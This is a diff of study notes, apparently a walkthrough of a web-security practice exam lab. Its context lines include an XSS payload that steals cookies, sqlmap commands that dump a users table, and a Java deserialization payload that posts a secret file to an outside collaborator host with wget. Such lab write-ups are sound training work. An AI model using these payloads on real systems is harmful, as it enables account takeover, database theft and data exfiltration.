@@ -26,13 +26,13 @@ potentially dangerous is the parentheses `()` so replace with backticks
 
 DOM-based XSS
 Needed to break out of searchTerm. DOM Invader exploit was useless.
-![Practice Exam 2-20260223211730855](Practice%20Exam%202-20260223211730855.png)
+![[Practice Exam 2-20260223211730855.png]]
 
 Replace `()` with backticks
 ```
 qq"};alert`1`;//
 ```
-![Practice Exam 2-20260223211849324](Practice%20Exam%202-20260223211849324.png)
+![[Practice Exam 2-20260223211849324.png]]
 
 payload
 ```
@@ -52,7 +52,7 @@ location = "https://0a40000e0334b1a38136b70d005f00c8.web-security-academy.net/?f
 ```
 
 
-![Practice Exam 2-20260223212949701](Practice%20Exam%202-20260223212949701.png)
+![[Practice Exam 2-20260223212949701.png]]
 Got the victim's cookie
 ```
 veA42qNYwLRECW07RMCPQjsU4yKYodrD
@@ -61,41 +61,41 @@ veA42qNYwLRECW07RMCPQjsU4yKYodrD
 
 Stage 2
 Advanced search > order param 
-![Practice Exam 2-20260223213306014](Practice%20Exam%202-20260223213306014.png)
+![[Practice Exam 2-20260223213306014.png]]
 
 ```
 sqlmap -r sqli_request_2 --level=5 --risk=3 -p 'order' --batch --dbs
 ```
 
-![Practice Exam 2-20260223214333146](Practice%20Exam%202-20260223214333146.png)
+![[Practice Exam 2-20260223214333146.png]]
 
 ```
 sqlmap -r sqli_request_2 --level=5 --risk=3 -p 'order' --batch --dbms=PostgreSQL -D public --tables
 ```
-![Practice Exam 2-20260223214555132](Practice%20Exam%202-20260223214555132.png)
+![[Practice Exam 2-20260223214555132.png]]
 
 ```
 sqlmap -r sqli_request_2 --level=5 --risk=3 -p 'order' --batch --dbms=PostgreSQL -D public -T users --dump
 ```
 
-![Practice Exam 2-20260223215214308](Practice%20Exam%202-20260223215214308.png)
+![[Practice Exam 2-20260223215214308.png]]
 
 Log in as `administrator:irzrq6x2nr7tvnrzeoy8`
-![Practice Exam 2-20260223215247183](Practice%20Exam%202-20260223215247183.png)
+![[Practice Exam 2-20260223215247183.png]]
 
 paste admin-pref in cyberchef
 Needed to url decode > base64 decode > gzip
 So for the payload we need to reverse it like gzip > base64 encode > url encode
-![Practice Exam 2-20260223215402982](Practice%20Exam%202-20260223215402982.png)
+![[Practice Exam 2-20260223215402982.png]]
 
-![Practice Exam 2-20260223215650960](Practice%20Exam%202-20260223215650960.png)
+![[Practice Exam 2-20260223215650960.png]]
 
 Correct payload to get flag
 ```
 CommonsCollections4 'wget https://q5wwpvd5ey3ohnhvj668au8mqdw4kw8l.oastify.com --post-file=/home/carlos/secret'
 ```
-![Practice Exam 2-20260223220116829](Practice%20Exam%202-20260223220116829.png)
+![[Practice Exam 2-20260223220116829.png]]
 
-![Practice Exam 2-20260223220145322](Practice%20Exam%202-20260223220145322.png)
+![[Practice Exam 2-20260223220145322.png]]
 
 
